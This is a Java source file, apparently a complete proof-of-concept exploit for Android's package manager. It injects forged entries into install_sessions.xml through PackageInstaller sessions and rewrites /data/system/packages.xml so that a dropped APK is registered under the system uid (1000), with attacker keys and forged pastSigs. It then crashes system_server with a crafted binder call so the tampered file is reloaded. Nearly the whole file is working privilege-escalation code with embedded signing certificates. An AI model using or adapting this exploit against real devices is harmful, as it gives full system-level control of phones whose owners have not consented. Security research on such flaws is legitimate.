package com.example.abxoverflow;

import android.content.Context;
import android.content.pm.PackageInstaller;
import android.os.FileUtils;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathFactory;

public class Main {

    static void stage1(Context ctx) throws IOException {
        PackageInstaller packageInstaller = ctx.getPackageManager().getPackageInstaller();

        for (PackageInstaller.SessionInfo session : packageInstaller.getMySessions()) {
            packageInstaller.abandonSession(session.getSessionId());
        }

        int sessionId = packageInstaller.createSession(new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL));

        ctx.getSharedPreferences("a", Context.MODE_PRIVATE).edit().putInt("sessionId", sessionId).commit();

        // Construct injection
        PackageInstaller.Session session = packageInstaller.openSession(sessionId);
        AbxInjector abxInjector = new AbxInjector();
        abxInjector.endTag("sessionChecksum");
        abxInjector.endTag("session");
        abxInjector.injectSession(sessionId, ctx.getPackageName(), true, "/data/system");
        abxInjector.injectSession(sessionId + 1, ctx.getPackageName(), false, "/data/app/dropped_apk");
        abxInjector.endTag("sessions");
        abxInjector.endDocument();
        abxInjector.injectInto(session);

        // Trigger save of new data into install_sessions.xml
        packageInstaller.abandonSession(packageInstaller.createSession(new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)));
    }

    static void stage2(Context ctx) throws Exception {
        PackageInstaller packageInstaller = ctx.getPackageManager().getPackageInstaller();
        int sessionId = ctx.getSharedPreferences("a", Context.MODE_PRIVATE).getInt("sessionId", 0);

        // Extract apk for installation
        try (PackageInstaller.Session session = packageInstaller.openSession(sessionId + 1)) {
            try (InputStream inputStream = ctx.getAssets().open("droppedapk-release.apk");
                 OutputStream outputStream = session.openWrite("base.apk", 0, 0)) {
                FileUtils.copy(inputStream, outputStream);
            }
        }

        // Patch /data/system/packages.xml
        try (PackageInstaller.Session session = packageInstaller.openSession(sessionId)) {
            // Read packages.xml and convert it to regular XML that DOM can parse
            File packagesXmlFile = ctx.getFileStreamPath("p.xml");
            Process process = new ProcessBuilder("abx2xml", "-", packagesXmlFile.getAbsolutePath())
                    .redirectInput(ProcessBuilder.Redirect.PIPE)
                    .start();

            try (InputStream inputStream = session.openRead("packages.xml")) {
                FileUtils.copy(inputStream, process.getOutputStream());
            }
            process.getOutputStream().close();
            process.waitFor();

            // Parse XML
            Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(packagesXmlFile);
            XPath xPath = XPathFactory.newInstance().newXPath();

            // Allocate <keyset> identifier
            Element lastIssuedKeySetId = (Element) xPath.compile("/packages/keyset-settings/lastIssuedKeySetId").evaluate(document, XPathConstants.NODE);
            Element lastIssuedKeyId = (Element) xPath.compile("/packages/keyset-settings/lastIssuedKeyId").evaluate(document, XPathConstants.NODE);
            int myKeySetId = Integer.parseInt(lastIssuedKeySetId.getAttribute("value")) + 1;
            int myKeyId = Integer.parseInt(lastIssuedKeyId.getAttribute("value")) + 1;
            lastIssuedKeySetId.setAttribute("value", String.valueOf(myKeySetId));
            lastIssuedKeyId.setAttribute("value", String.valueOf(myKeyId));

            // Insert <public-key> and <keyset> for newly added apk
            {
                Element publicKey = document.createElement("public-key");
                publicKey.setAttribute("identifier", String.valueOf(myKeyId));
                publicKey.setAttribute("value", TARGET_KEY_BASE64);
                ((Element) xPath.compile("/packages/keyset-settings/keys").evaluate(document, XPathConstants.NODE)).appendChild(publicKey);
            }
            {
                Element keyset = document.createElement("keyset");
                Element keyId = document.createElement("key-id");
                keyset.setAttribute("identifier", String.valueOf(myKeySetId));
                keyId.setAttribute("identifier", String.valueOf(myKeyId));
                keyset.appendChild(keyId);
                ((Element) xPath.compile("/packages/keyset-settings/keysets").evaluate(document, XPathConstants.NODE)).appendChild(keyset);
            }

            // Insert new <package>
            int myCertIndex = 0;
            {
                NodeList certs = (NodeList) xPath.compile("/packages/package//cert[@index][@key]").evaluate(document, XPathConstants.NODESET);
                for (int i = 0; i < certs.getLength(); i++) {
                    int certIndex = Integer.parseInt(((Element) certs.item(i)).getAttribute("index"));
                    myCertIndex = Math.max(myCertIndex, certIndex + 1);
                }
            }
            {
                Element packageElem = document.createElement("package");
                packageElem.setAttribute("name", TARGET_PACKAGE_NAME);
                packageElem.setAttribute("codePath", "/data/app/dropped_apk");
                packageElem.setAttribute("sharedUserId", "1000");
                packageElem.setAttribute("publicFlags", "0");
                Element sigsElem = document.createElement("sigs");
                sigsElem.setAttribute("count", "1");
                sigsElem.setAttribute("schemeVersion", "2");
                Element certElem = document.createElement("cert");
                certElem.setAttribute("index", String.valueOf(myCertIndex));
                certElem.setAttribute("key", TARGET_CERT_HEX);
                sigsElem.appendChild(certElem);
                packageElem.appendChild(sigsElem);
                Element firstSharedUser = (Element) xPath.compile("/packages/shared-user").evaluate(document, XPathConstants.NODE);
                firstSharedUser.getParentNode().insertBefore(packageElem, firstSharedUser);
            }

            // Insert <pastSigs> into <shared-user name="android.uid.system" userId="1000"><sigs>
            {
                Element sharedUser = (Element) xPath.compile("/packages/shared-user[@userId=\"1000\"]/sigs").evaluate(document, XPathConstants.NODE);
                // Delete previously existing <pastSigs> if any
                deletePastSigsLoop:
                for (; ; ) {
                    NodeList childNodes = sharedUser.getChildNodes();
                    for (int i = 0; i < childNodes.getLength(); i++) {
                        Node item = childNodes.item(i);
                        if (item instanceof Element && "pastSigs".equals(item.getNodeName())) {
                            sharedUser.removeChild(item);
                            continue deletePastSigsLoop;
                        }
                    }
                    break;
                }
                // Insert new <pastSigs>
                Element pastSigsElem = document.createElement("pastSigs");
                pastSigsElem.setAttribute("count", "2");
                pastSigsElem.setAttribute("schemeVersion", "3");
                for (int i = 0; i < 2; i++) {
                    Element certElem = document.createElement("cert");
                    certElem.setAttribute("index", String.valueOf(myCertIndex));
                    certElem.setAttribute("flags", "2");
                    pastSigsElem.appendChild(certElem);
                }
                sharedUser.appendChild(pastSigsElem);
            }

            // Write new XML
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            TransformerFactory.newInstance().newTransformer()
                    .transform(new DOMSource(document), new StreamResult(baos));

            try (OutputStream outputStream = session.openWrite("packages-backup.xml", 0, 0)) {
                outputStream.write(baos.toByteArray());
            }
        }
    }

    static void crashSystemServer() throws IOException {
        new ProcessBuilder(
                // IAlarmManager.set
                "service", "call", "alarm", "1",
                // String callingPackage
                "i32", "-1",
                // int type
                "i32", "0",
                // long triggerAtTime
                "i64", "0",
                // long windowLength
                "i64", "0",
                // long interval
                "i64", "0",
                // int flags
                "i32", "0",
                // PendingIntent operation == null
                "i32", "0",
                // IAlarmListener listener
                "null",
                // String listenerTag
                "i32", "-1",
                // WorkSource workSource == null
                "i32", "0",
                // AlarmManager.AlarmClockInfo alarmClock != null
                "i32", "1",
                // long mTriggerTime
                "i64", "0",
                // mShowIntent = readParcelable
                "s16", "android.content.pm.PackageParser$Activity",
                // String PackageParser.Component.className = null
                "i32", "-1",
                // String PackageParser.Component.metaData = null
                "i32", "-1",
                // createIntentsList() N=1
                "i32", "1",
                // Class.forName()
                "s16", "android.os.PooledStringWriter",
                // Padding so write goes in-place into read-only preallocated memory
                "i32", "0"
        ).start();
    }




    static final String TARGET_PACKAGE_NAME = "com.example.abxoverflow.droppedapk";
    static final String TARGET_CERT_HEX = "308202a43082018c020101300d06092a864886f70d01010b050030183116301406035504030c0d61627864726f7070656461706b301e170d3233313032303038353535365a170d3438313031333038353535365a30183116301406035504030c0d61627864726f7070656461706b30820122300d06092a864886f70d01010105000382010f003082010a0282010100928c5e2732fa5e0ffad5baca33543bc54fe19b6a5d24da8cfc404ad00811f0ad7f632a6b1bf06ac9d41e3ab01bc7af4510255667ee45849ae9fa8e262156d9e3809e0fa90748f3cbf3b7480965b655f195859630f03a9ca84ccc31f9808cf87e8ac6d107d918da4c1523e787a61e6231cce4ede22934800cb2da9244728a01d757ae38b207a70c6ba5081d2ded3104ce8882558a64abe128b855e122dd1a674cd75d56171af7f08bfa07ce8de30cc8aece12ee202927d1fde3196550cc64781ed4d5c3e14c7bd80b364cc9acb8ed80c67d4bfcd984ff8f1718c370fc5d34a25c8563d0cef1e1a02fa3d975518af512d4b6ecc3e625a5d11c4deda9a6d46a80410203010001300d06092a864886f70d01010b050003820101000a524837b72e5cffddfa675b7840d014fd4bdbd360c0e8d825caf0f4667d122c1503dc21a77517e988416e648619daa94968b509aca29286a9b36b2d23c6c164ef6fa3e23fcb09ce680e19c7f4617a7e4107668096c27f0f79cddb60df79c901662dee6b864df7380023a9ac1b445ac339c04ddb4d5701d72bee30f79583de6e001631f884b5616a7a0c1094b13dfbbd29053a3c6841aa92a1e7a6ab60c2099a2fec8566f15c1163b31c0a3f12406bfaa35aff3dbfff3a352bc921d9e719569179ded2e682dbd68c8c87393baed0be66111320b187dec85b071fd850c1b41f34fc97b014d155b10c10e77cb9b5c4b4d5247aca6155463f77352fd3f20ee0a330";
            // release "308202d8308201c0a003020102021453136703198fc15c260df072e213019a610ce489300d06092a864886f70d01010b050030253123302106035504030c1a616e64726f69642d696e6a65637465642d73797374656d6b65793020170d3235313130383031323032365a180f32313235313130383031323032365a30253123302106035504030c1a616e64726f69642d696e6a65637465642d73797374656d6b657930820122300d06092a864886f70d01010105000382010f003082010a028201010095f9429dec61147e664181e2d152fa11df38a7e61d6c4f0778e516fca2685b6aa51b026cfa1376a13cb1e5d369de31d89588a3c203063dbba7a165c9f3326b6f2864af1f8efd1c9ae8b46b51f21b619bdc3c725b8a82cf681646bf7f00a221acb28d7cc863039d5a9b1ee3c2943211ce7087a9e7798d5fb84dc0f6255fa27600ef7d29e26fa55beb9bf795579c81b6aaf51ad897c32c6704bdf382dd68945ff2ed482df27a4d995450ed491135fecc8e6a101aebcb806f2052823f7a96a127163240ae6e4dfed120c9c8ad4c158d7c607df93437482d93dcfd10e607b5e6c7df845f11d0010ccd12d1bee3a43522917fda776ffdb3bca3cda9bdbbbc5208642d0203010001300d06092a864886f70d01010b050003820101002c47f56512edc259ca852bb03736f4a9dfa3ced840b74b7cd0e61b8dd78894e4918516b09aa92dc720ae65b8910a4d31f8f2608bf4432b977656483188bf034256e19c312ca0c471f6edbc6bf95055710548f74591679faf35d342219df0c89b410b0a45544828fe42dd223747cd40a67a4d9e82d192d8e62e838b953dbb32f38ea44e08755e9f827da5d41d14c91349f4f7f8c0a815e347d5b73dc7e373d20586579c53f5cf06ec78f9041c311905e53aa06389c55be40d05a5d546214c92a384fd6f8cb91d9726b98a64135c756c5e462cae203c943e0d98677348330743d93ffa34377601fc343a8d2b1ce747770db5d9ef67278a9244b56f47df3a4f6114";
    static final String TARGET_KEY_BASE64 =
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlflCnexhFH5mQYHi0VL6" +
            "Ed84p+YdbE8HeOUW/KJoW2qlGwJs+hN2oTyx5dNp3jHYlYijwgMGPbunoWXJ8zJr" +
            "byhkrx+O/Rya6LRrUfIbYZvcPHJbioLPaBZGv38AoiGsso18yGMDnVqbHuPClDIR" +
            "znCHqed5jV+4TcD2JV+idgDvfSnib6Vb65v3lVecgbaq9RrYl8MsZwS984LdaJRf" +
            "8u1ILfJ6TZlUUO1JETX+zI5qEBrry4BvIFKCP3qWoScWMkCubk3+0SDJyK1MFY18" +
            "YH35NDdILZPc/RDmB7Xmx9+EXxHQAQzNEtG+46Q1IpF/2ndv/bO8o82pvbu8Ughk" +
            "LQIDAQAB";
}
